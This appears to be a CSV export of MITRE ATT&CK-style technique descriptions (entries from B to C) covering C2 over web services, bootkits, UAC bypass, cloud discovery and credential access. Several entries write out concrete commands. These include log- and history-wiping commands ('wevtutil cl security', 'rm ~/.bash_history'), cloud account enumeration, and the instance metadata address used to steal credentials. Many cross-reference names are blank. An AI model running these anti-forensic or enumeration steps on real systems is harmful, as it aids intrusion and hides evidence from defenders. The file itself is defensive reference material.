Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",technique
Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed. ",technique
Boot or Logon Autostart Execution,"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",technique
Boot or Logon Initialization Scripts,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",technique
Bootkit,"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",technique
Botnet,"Before compromising a victim, adversaries may buy, lease, or rent a network of compromised systemsthat can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale  or Distributed Denial of Service (DDoS).",technique
Botnet,"Before compromising a victim, adversaries may compromise numerous third-party systems to form a botnetthat can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale  or Distributed Denial of Service (DDoS).",technique
Browser Bookmark Discovery,"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially  associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",technique
Browser Extensions,"Adversaries may abuse Internet browser extensions to establish persistence access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.  Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.  Once the extension is installed, it can browse to websites in the background,   steal all information that a user enters into a browser (including credentials)   and be used as an installer for a RAT for persistence.There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.  There have also been similar examples of extensions being used for command & control  .",technique
Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",technique
Business Relationships,"Before compromising a victim, adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organizations business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victims hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via . Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: , , or ).",technique
Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated  objects without prompting the user through the UAC notification box.   An example of this is use of  to load a specifically crafted DLL which loads an auto-elevated  object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:* eventvwr.exe can auto-elevate and execute a specified binary or script.Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",technique
CDNs,"Before compromising a victim, adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestors geographical region.Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organizations website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to  / Squiblydoo, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.CMSTP.exe can also be abused to  and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.   ",technique
COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a  (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: ) if the victim .NET process executes at a higher permission level, as well as to hook and  provided by .NET processes.",technique
Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires  to recover the plaintext password.With SYSTEM access, the tools/utilities such as , , and secretsdump.py can be used to extract the cached credentials.Note: Cached credentials for Windows Vista are derived using PBKDF2.",technique
Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access   or by administrators using the built-in assoc utility.  Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under HKEY_CLASSES_ROOT\.[extension], for example HKEY_CLASSES_ROOT\.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\[handler]\shell\[action]\command. For example: * HKEY_CLASSES_ROOT\txtfile\shell\open\command* HKEY_CLASSES_ROOT\txtfile\shell\print\command* HKEY_CLASSES_ROOT\txtfile\shell\printto\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. ",technique
Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions.Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history.On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.",technique
Clear Linux or Mac System Logs,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:* /var/log/messages:: General and system-related messages* /var/log/secure or /var/log/auth.log: Authentication logs* /var/log/utmp or /var/log/wtmp: Login records* /var/log/kern.log: Kernel logs* /var/log/cron.log: Crond logs* /var/log/maillog: Mail server logs* /var/log/httpd/: Web server access and error logs",technique
Clear Windows Event Logs,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.The event logs can be cleared with the following utility commands:* wevtutil cl system* wevtutil cl application* wevtutil cl securityThese logs may also be cleared through other mechanisms, such as the event viewer GUI or .",technique
Client Configurations,"Before compromising a victim, adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.Adversaries may gather this information in various ways, such as direct collection actions via  (ex: listening ports, server banners, user agent strings) or . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Clipboard Data,"Adversaries may collect data stored in the clipboard from users copying information within or between applications. In Windows, Applications can access clipboard data by using the Windows API. OSX provides a native command, pbpaste, to grab clipboard contents.",technique
Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.",technique
Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command az ad user list will list all users within a domain. The AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix. In GCP, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in a project.",technique
Cloud Accounts,"Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a . Similar to , compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.",technique
Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.With authenticated access there are several tools that can be used to find permissions groups. The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.Azure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command az ad user get-member-groups will list groups associated to a user account.",technique
Cloud Infrastructure Discovery,"An adversary may attempt to discover resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, as well as the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request. Similarly, GCP's Cloud SDK CLI provides the gcloud compute instances list command to list all Google Compute Engine instances in a project, and Azure's CLI command az vm list lists details of virtual machines.An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence. Unlike in , this technique focuses on the discovery of components of the provided services rather than the services themselves.",technique
Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.The de facto standard across cloud service providers is to host the Instance Metadata API at http[:]//169.254.169.254.",technique
Cloud Service Dashboard,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",technique
Cloud Service Discovery,"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.",technique
Code Signing,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike , this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.  Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",technique
Code Signing Certificates,"Before compromising a victim, adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to , adversaries may develop self-signed code signing certificates for use in operations.",technique
Code Signing Certificates,"Before compromising a victim, adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to , adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",technique
Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of  while Windows installations include the  and .There are also cross-platform interpreters such as , as well as those commonly associated with client applications such as  and .Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in  payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",technique
Commonly Used Port,"**This technique has been deprecated. Please use  where appropriate.**Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as* TCP:80 (HTTP)* TCP:443 (HTTPS)* TCP:25 (SMTP)* TCP/UDP:53 (DNS)They may use the protocol associated with the port or a completely different protocol. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are * TCP/UDP:135 (RPC)* TCP/UDP:22 (SSH)* TCP/UDP:3389 (RDP)",technique
Communication Through Removable Media,"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by . Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",technique
Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a . Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",technique
Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). A custom CHM file containing embedded payloads could be delivered to a victim then triggered by . CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.  ",technique
Component Firmware,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to  but conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",technique
Component Object Model,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and . Specific COM objects also exist to directly perform functions beyond code execution, such as creating a , fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",technique
Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",technique
Component Object Model and Distributed COM,"**This technique has been deprecated. Please use  and .**Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). DCOM is transparent middleware that extends the functionality of Component Object Model (COM)  beyond a local computer using remote procedure call (RPC) technology.Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.  By default, only Administrators may remotely activate and launch COM objects through DCOM.Adversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript. Specific COM objects also exists to directly perform functions beyond code execution, such as creating a , fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications  as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents  and may also invoke  (DDE) execution directly through a COM created instance of a Microsoft Office application , bypassing the need for a malicious document.",technique
Compromise Accounts,"Before compromising a victim, adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. ), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts for  or .",technique
Compromise Client Software Binary,"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",technique
Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",technique
Compromise Infrastructure,"Before compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.",technique
Compromise Software Dependencies and Development Tools,Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.   Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ,technique
Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.   ",technique
Confluence,"Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials* Work / project schedules* Source code snippets* Links to network shares and other internal resources",technique
Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. Malicious Control Panel items can be delivered via  campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.",technique
Create Account,"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",technique
Create Cloud Instance,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may  of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect  or for .Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",technique
Create Process with Token,Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.,technique
Create Snapshot,"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in  where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.An adversary may , mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",technique
Create or Modify System Process,"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.  On macOS, launchd processes known as  and  are run to finish system initialization and load user specific parameters. Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. .  ",technique
Credential API Hooking,"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike ,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.* **Import address table (IAT) hooking**, which use modifications to a processs IAT, where pointers to imported API functions are stored.* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",technique
